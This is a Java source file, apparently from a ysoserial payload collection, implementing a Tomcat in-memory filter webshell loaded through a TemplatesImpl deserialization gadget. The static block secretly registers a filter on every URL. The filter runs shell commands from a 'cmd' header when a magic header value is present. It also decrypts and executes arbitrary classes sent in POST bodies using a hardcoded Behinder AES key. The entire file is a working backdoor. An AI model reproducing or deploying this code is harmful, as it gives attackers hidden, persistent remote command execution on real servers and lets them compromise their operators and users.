package ysoserial.payloads.templates;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.apache.catalina.Context;
import org.apache.catalina.connector.Request;
import org.apache.catalina.connector.RequestFacade;
import org.apache.catalina.core.ApplicationFilterConfig;
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.loader.WebappClassLoaderBase;
import org.apache.tomcat.util.descriptor.web.FilterDef;
import org.apache.tomcat.util.descriptor.web.FilterMap;
import org.apache.tomcat.util.http.Parameters;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.servlet.*;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;
import java.io.IOException;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.*;

public class TomcatFilterMemShellFromThread extends AbstractTranslet implements Filter {
    static {
        try {
            final String name = "MyFilterVersion" + System.nanoTime();
            final String URLPattern = "/*";

            WebappClassLoaderBase webappClassLoaderBase =
                (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
            StandardContext standardContext = (StandardContext) webappClassLoaderBase.getResources().getContext();

            Class<? extends StandardContext> aClass = null;
            try {
                aClass = (Class<? extends StandardContext>) standardContext.getClass().getSuperclass();
                aClass.getDeclaredField("filterConfigs");
            } catch (Exception e) {
                aClass = (Class<? extends StandardContext>) standardContext.getClass();
                aClass.getDeclaredField("filterConfigs");
            }
            Field Configs = aClass.getDeclaredField("filterConfigs");
            Configs.setAccessible(true);
            Map filterConfigs = (Map) Configs.get(standardContext);

            TomcatFilterMemShellFromThread behinderFilter = new TomcatFilterMemShellFromThread();

            FilterDef filterDef = new FilterDef();
            filterDef.setFilter(behinderFilter);
            filterDef.setFilterName(name);
            filterDef.setFilterClass(behinderFilter.getClass().getName());
            /**
             * 将filterDef添加到filterDefs中
             */
            standardContext.addFilterDef(filterDef);

            FilterMap filterMap = new FilterMap();
            filterMap.addURLPattern(URLPattern);
            filterMap.setFilterName(name);
            filterMap.setDispatcher(DispatcherType.REQUEST.name());

            standardContext.addFilterMapBefore(filterMap);

            Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);
            constructor.setAccessible(true);
            ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);

            filterConfigs.put(name, filterConfig);
        } catch (Exception e) {
//            e.printStackTrace();
        }
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }

    @Override
    public void init(FilterConfig filterConfig) throws ServletException {

    }

    @Override
    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
        HttpServletRequest request = (HttpServletRequest) servletRequest;
        HttpServletResponse response = (HttpServletResponse) servletResponse;
        try {
            // 入口
            if (request.getHeader("x-client-data").equalsIgnoreCase("b14eadc8b152942dfcd697f0f3568d7214d15766843ae7928db19bec76d88572")) {
                if (request.getMethod().equals("GET")) {
                    String cmd = request.getHeader("cmd");
                    if (cmd != null && !cmd.isEmpty()) {
                        String[] cmds = null;
                        if (System.getProperty("os.name").toLowerCase().contains("win")) {
                            cmds = new String[]{"cmd", "/c", cmd};
                        } else {
                            cmds = new String[]{"/bin/bash", "-c", cmd};
                        }
                        String result = new Scanner(Runtime.getRuntime().exec(cmds).getInputStream()).useDelimiter("\\A").next();
                        response.getWriter().println(result);
                    }
                } else if (request.getMethod().equals("POST") && request.getHeader("Referer").equalsIgnoreCase("https://www.google.com/")) {
                    // 创建pageContext
                    HttpSession session = request.getSession();
                    HashMap pageContext = new HashMap();
                    pageContext.put("request", request);
                    pageContext.put("response", response);
                    pageContext.put("session", session);
                    Object lastRequest = request;

                    // 解决包装类RequestWrapper的问题
                    if (!(request instanceof RequestFacade)) {
                        Method getRequest = ServletRequestWrapper.class.getMethod("getRequest");
                        lastRequest = getRequest.invoke(request);
                        while (true) {
                            if (lastRequest instanceof RequestFacade) break;
                            lastRequest = getRequest.invoke(lastRequest);
                        }
                    }
                    // 拿到真实的request
                    Field field = null;
                    field = lastRequest.getClass().getDeclaredField("request");
                    field.setAccessible(true);
                    Request realRequest = (Request) field.get(lastRequest);
                    // 从coyoteRequest中拼接body参数
                    Field coyoteRequestField = realRequest.getClass().getDeclaredField("coyoteRequest");
                    coyoteRequestField.setAccessible(true);
                    org.apache.coyote.Request coyoteRequest = (org.apache.coyote.Request) coyoteRequestField.get(realRequest);
                    Parameters parameters = coyoteRequest.getParameters();
                    Field paramHashValues = parameters.getClass().getDeclaredField("paramHashValues");
                    paramHashValues.setAccessible(true);
                    LinkedHashMap paramMap = (LinkedHashMap) paramHashValues.get(parameters);

                    Iterator<Map.Entry<String, ArrayList<String>>> iterator = paramMap.entrySet().iterator();
                    String payload = "";
                    while (iterator.hasNext()) {
                        Map.Entry<String, ArrayList<String>> next = iterator.next();
                        payload = payload + next.getKey().replaceAll(" ", "+") + "=";
                        ArrayList<String> list = next.getValue();
                        String listString = "";
                        for (String s : list) {
                            listString += s;
                        }
                        payload = payload + listString.replaceAll(" ", "+");
                    }

                    // 冰蝎逻辑
                    String k = "e45e329feb5d925b"; // rebeyond
                    session.putValue("u", k);
                    Cipher c = Cipher.getInstance("AES");
                    c.init(2, new SecretKeySpec(k.getBytes(), "AES"));
                    Method method = Class.forName("java.lang.ClassLoader").getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
                    method.setAccessible(true);
                    byte[] evilclass_byte = c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(payload));
                    Class evilclass = (Class) method.invoke(Thread.currentThread().getContextClassLoader(), evilclass_byte, 0, evilclass_byte.length);
                    evilclass.newInstance().equals(pageContext);
                }
                return;
            }
        } catch (Exception e) {
//            e.printStackTrace();
        }
        filterChain.doFilter(servletRequest, servletResponse);
    }

    @Override
    public void destroy() {

    }
}
